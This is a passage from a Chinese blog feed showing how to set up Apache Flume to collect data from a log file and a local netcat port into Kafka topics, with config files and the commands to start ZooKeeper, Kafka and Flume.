class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 定义这个agent中各组件的名字</span></span><br><span class="line">a1.sources = r1</span><br><span class="line">a1.sinks = k1</span><br><span class="line">a1.channels = c1</span><br><span class="line"> </span><br><span class="line"><span class="comment"># 描述和配置source组件：r1</span></span><br><span class="line">a1.sources.r1.type = <span class="built_in">exec</span></span><br><span class="line">a1.sources.r1.command = <span class="built_in">tail</span> -F /tmp/log.txt</span><br><span class="line"> </span><br><span class="line"><span class="comment"># 描述和配置sink组件：k1</span></span><br><span class="line">a1.sinks.k1.type = org.apache.flume.sink.kafka.KafkaSink</span><br><span class="line">a1.sinks.k1.kafka.topic = topic-test</span><br><span class="line">a1.sinks.k1.kafka.bootstrap.servers = localhost:9092</span><br><span class="line">a1.sinks.k1.kafka.flumeBatchSize = 20</span><br><span class="line">a1.sinks.k1.kafka.producer.acks = 1</span><br><span class="line">a1.sinks.k1.kafka.producer.linger.ms = 1</span><br><span class="line">a1.sinks.ki.kafka.producer.compression.type = snappy</span><br><span class="line"> </span><br><span class="line"><span class="comment"># 描述和配置channel组件，此处使用是内存缓存的方式</span></span><br><span class="line">a1.channels.c1.type = memory</span><br><span class="line">a1.channels.c1.capacity = 1000</span><br><span class="line">a1.channels.c1.transactionCapacity = 100</span><br><span class="line"> </span><br><span class="line"><span class="comment"># 描述和配置source  channel   sink之间的连接关系</span></span><br><span class="line">a1.sources.r1.channels = c1</span><br><span class="line">a1.sinks.k1.channel = c1</span><br></pre></td></tr></table></figure><p>1.2 启动zookeeper和kafka</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">./zkServer.sh start</span><br><span class="line">JMX enabled by default</span><br><span class="line">Using config: /root/software/zookeeper-3.4.5-cdh5.6.0/bin/../conf/zoo.cfg</span><br><span class="line">Starting zookeeper ... already running as process 5452.</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kafka-server-start.sh ./config/server.properties</span><br></pre></td></tr></table></figure><p>1.3 创建topic</p><p>topic:指定topic name</p><p>partitions:指定分区数，这个参数需要根据broker数和数据量决定，正常情况下，每个broker上两个partition最好</p><p>replication-factor:副本数，建议设置为2</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kafka-topics.sh --zookeeper localhost: 2181/kafka --create --topic topic-test2 --replication-factor 1 --partitions 1</span><br></pre></td></tr></table></figure><p>1.4 启动kafka去消费topic</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">kafka-console-consumer.sh --bootstrap-server localhost:9092 --topic topic-test2</span><br><span class="line">--from-beginning 可选参数,代表从头消费</span><br></pre></td></tr></table></figure><p>1.5 启动flume</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./bin/flume-ng agent -n a1 -c ./conf/ -f ./conf/flume-kafka-port.conf -Dflume.root.logger=INFO,console</span><br></pre></td></tr></table></figure><p>1.6 向日志文件&#x2F;tmp&#x2F;log.txt写入一些数据</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;123&#x27;</span> &gt;&gt; /tmp/log.txt</span><br></pre></td></tr></table></figure><p>就可以在消费者窗口看到输出</p><h4 id="2-flume采集端口数据到kafka自定义topic"><a href="#2-flume采集端口数据到kafka自定义topic" class="headerlink" title="2.flume采集端口数据到kafka自定义topic"></a>2.flume采集端口数据到kafka自定义topic</h4><p>2.1 新建配置文件 flume-kafka-port.conf</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#指定agent</span></span><br><span class="line">a1.sources = r1</span><br><span class="line">a1.sinks = k1</span><br><span class="line">a1.channels = c1</span><br><span class="line"> </span><br><span class="line"><span class="comment"># 描述和配置source组件：r1</span></span><br><span class="line">a1.sources.r1.type = netcat</span><br><span class="line">a1.sources.r1.bind = localhost</span><br><span class="line">a1.sources.r1.port = 55555 </span><br><span class="line"><span class="comment"># 描述和配置sink组件：k1</span></span><br><span class="line">a1.sinks.k1.type = org.apache.flume.sink.kafka.KafkaSink</span><br><span class="line">a1.sinks.k1.kafka.topic = topic-test2</span><br><span class="line">a1.sinks.k1.kafka.bootstrap.servers = localhost:9092</span><br><span class="line">a1.sinks.k1.kafka.flumeBatchSize = 20</span><br><span class="line">a1.sinks.k1.kafka.producer.acks = 1</span><br><span class="line">a1.sinks.k1.kafka.producer.linger.ms = 1</span><br><span class="line">a1.sinks.ki.kafka.producer.compression.type = snappy</span><br><span class="line"> </span><br><span class="line"><span class="comment"># 描述和配置channel组件，此处使用是内存缓存的方式</span></span><br><span class="line">a1.channels.c1.type = memory</span><br><span class="line">a1.channels.c1.capacity = 1000</span><br><span class="line">a1.channels.c1.transactionCapacity = 100</span><br><span class="line"> </span><br><span class="line"><span class="comment"># 描述和配置source  channel   sink之间的连接关系</span></span><br><span class="line">a1.sources.r1.channels = c1</span><br><span class="line">a1.sinks.k1.channel = c1</span><br></pre></td></tr></table></figure><p>2.2所有操作与上文一致<br>略</p><p>2.3 向端口发送数据</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:~<span class="comment"># nc localhost 55555</span></span><br><span class="line">OK</span><br><span class="line"><span class="built_in">ls</span></span><br><span class="line">OK</span><br><span class="line"><span class="built_in">ls</span></span><br><span class="line">OK</span><br><span class="line"><span class="built_in">ls</span></span><br><span class="line">OK</span><br><span class="line"><span class="built_in">ls</span></span><br><span class="line">OK</span><br><span class="line"><span class="built_in">ls</span></span><br></pre></td></tr></table></figure><p>在消费者端口可以看到</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">ls</span></span><br><span class="line"><span class="built_in">ls</span></span><br><span class="line"><span class="built_in">ls</span></span><br><span class="line"><span class="built_in">ls</span></span><br><span class="line"><span class="built_in">ls</span></span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;h3 id=&quot;一-配置ip-三个节点&quot;&gt;&lt;a href=&quot;#一-配置ip-三个节点&quot; class=&quot;headerlink&quot; title=&quot;一.配置ip(三个节点)&quot;&gt;&lt;/a&gt;一.配置ip(三个节点)&lt;/h3&gt;&lt;p&gt;自ubuntu17之后多了一种配置方式更加高效,也就是netplan&lt;/p&gt;
&lt;p&gt;1.1编辑配置文件&lt;/p&gt;
&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;root@master:/etc/netplan&lt;span class=&quot;comment&quot;&gt;# gedit /etc/netplan/01-network-manager-all.yaml&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;配置内容如下,&lt;code&gt;注意缩进&lt;/code&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="环境搭建" scheme="http://example.com/categories/%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/"/>
    
    
    <category term="hadoop" scheme="http://example.com/tags/hadoop/"/>
    
    <category term="kafka" scheme="http://example.com/tags/kafka/"/>
    
    <category term="flume" scheme="http://example.com/tags/flume/"/>
    
  </entry>
  
</feed>
